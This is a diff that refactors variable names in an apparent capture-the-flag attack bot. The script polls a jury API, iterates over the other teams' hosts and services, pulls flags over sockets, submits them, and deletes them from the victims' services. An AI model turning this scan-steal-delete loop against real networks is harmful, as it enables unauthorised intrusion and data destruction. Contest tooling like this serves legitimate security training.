@@ -49,29 +49,29 @@ import traceback
 import requests
 
 if len(sys.argv) < 2:
-    sys.exit("Expected parameter <juryhost> like 10.10.100.101:8080")
+    sys.exit("Expected parameter <jury_host> like 10.10.100.101:8080")
 
-JURYHOST = sys.argv[1]
+JURY_HOST = sys.argv[1]
 SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
 FLAGS_DIR = os.path.join(SCRIPT_DIR, 'flags')
 
 
-def get_myip():
+def get_my_ip():
     """ request jury api """
-    url = 'http://' + JURYHOST + '/api/v1/myip'
+    url = 'http://' + JURY_HOST + '/api/v1/myip'
     try:
         resp = requests.get(url, timeout=5)
         if resp.status_code == 200:
             return resp.json()["myip"]
     except Exception as err:  # pylint: disable=broad-except
-        print("get_myip, Could not connect to jury " + url, str(err))
+        print("get_my_ip, Could not connect to jury " + url, str(err))
         print(traceback.format_exc())
     return None
 
 
 def get_teams():
     """ request jury api """
-    url = 'http://' + JURYHOST + '/api/v1/teams'
+    url = 'http://' + JURY_HOST + '/api/v1/teams'
     try:
         resp = requests.get(url, timeout=5)
         if resp.status_code == 200:
@@ -84,7 +84,7 @@ def get_teams():
 
 def get_scoreboard():
     """ request jury api """
-    url = 'http://' + JURYHOST + '/api/v1/scoreboard'
+    url = 'http://' + JURY_HOST + '/api/v1/scoreboard'
     try:
         resp = requests.get(url, timeout=5)
         if resp.status_code == 200:
@@ -97,7 +97,7 @@ def get_scoreboard():
 
 def send_flag(your_teamnum, flag):
     """ request jury api """
-    url = 'http://' + JURYHOST + '/flag'
+    url = 'http://' + JURY_HOST + '/flag'
     url += '?teamid=' + str(your_teamnum)
     url += '&flag=' + flag
     try:
@@ -163,8 +163,8 @@ def get_flag(ip_address, port, flag_id):
         return flag2
     except socket.timeout:
         print("get_flag, socket.timeout")
-    except socket.error as serr:
-        print("get_flag,", str(serr))
+    except socket.error as _err:
+        print("get_flag,", str(_err))
     except Exception as err:  # pylint: disable=broad-except
         print("get_flag,", str(err))
         print(traceback.format_exc())
@@ -198,16 +198,16 @@ def get_list_flag_ids(ip_address, port):
             flag_ids.append(flag_id)
     except socket.timeout:
         print("get_list_flag_ids, Socket timeout")
-    except socket.error as serr:
-        print("get_list_flag_ids, socket.error", serr)
+    except socket.error as _err:
+        print("get_list_flag_ids, socket.error", _err)
     except Exception as err:  # pylint: disable=broad-except
         print("get_list_flag_ids, Exception", str(err))
         print(traceback.format_exc())
     return flag_ids
 
 
-def start_exploit(your_teamnum, ip_address, port):
-    """ start exploit to specific servce """
+def start_exploit(your_team_num, ip_address, port):
+    """ start exploit to specific service """
     # print("Start attack to (" + ip_address + ":" + str(port) + ")")
     flag_ids = get_list_flag_ids(ip_address, port)
 
@@ -225,7 +225,7 @@ def start_exploit(your_teamnum, ip_address, port):
             continue
         print(flag_id + ": " + flag)
         if flag != '':
-            ret = send_flag(your_teamnum, flag)
+            ret = send_flag(your_team_num, flag)
             if ret is not None:
                 prev_flags[flag] = ret
                 delete_flag(ip_address, port, flag_id)
@@ -250,9 +250,9 @@ while True:
         time.sleep(5)
         continue
 
-    myip = get_myip()
-    SUBNETWORK = ".".join(myip.split(".")[:-1]) + "."
-    # print("my ip = ", myip)
+    my_ip = get_my_ip()
+    SUBNETWORK = ".".join(my_ip.split(".")[:-1]) + "."
+    # print("my ip = ", my_ip)
     # print("my subnetwork = " + SUBNETWORK + "0/24")
 
     FOUND_TEAM = None
@@ -267,18 +267,18 @@ while True:
         FOUND_TEAM = found_teams[0]
     else:
         for team in found_teams:
-            if team['ip_address'] == myip:
+            if team['ip_address'] == my_ip:
                 # print("Found team by ip")
                 FOUND_TEAM = team
 
     if not FOUND_TEAM:
-        print("ERROR: Could not detect team number - please hardcode (" + myip + ")")
+        print("ERROR: Could not detect team number - please hardcode (" + my_ip + ")")
         time.sleep(5)
         continue
 
-    my_teamid = FOUND_TEAM['id']
+    my_team_id = FOUND_TEAM['id']
 
-    # print("your team is " + my_teamid)
+    # print("your team is " + my_team_id)
     scoreboard = get_scoreboard()
     if scoreboard is None:
         time.sleep(5)
@@ -293,13 +293,13 @@ while True:
         team_scoreboard = scoreboard['scoreboard'][team_id]['ts_sta']
         # print(team_scoreboard.keys())
 
-        if team_id != my_teamid:
-            for serviceid in team_scoreboard:
-                servioceport = SERVICES_PORTS[serviceid]
-                service_info = team_scoreboard[serviceid]
+        if team_id != my_team_id:
+            for service_id in team_scoreboard:
+                service_port = SERVICES_PORTS[service_id]
+                service_info = team_scoreboard[service_id]
                 # print(service_info)
                 if service_info['status'] != 'down':
                     ATTACKED_SERVICES += 1
-                    start_exploit(my_teamid, team_ip_address, servioceport)
+                    start_exploit(my_team_id, team_ip_address, service_port)
     if ATTACKED_SERVICES < 6:
         time.sleep(10)
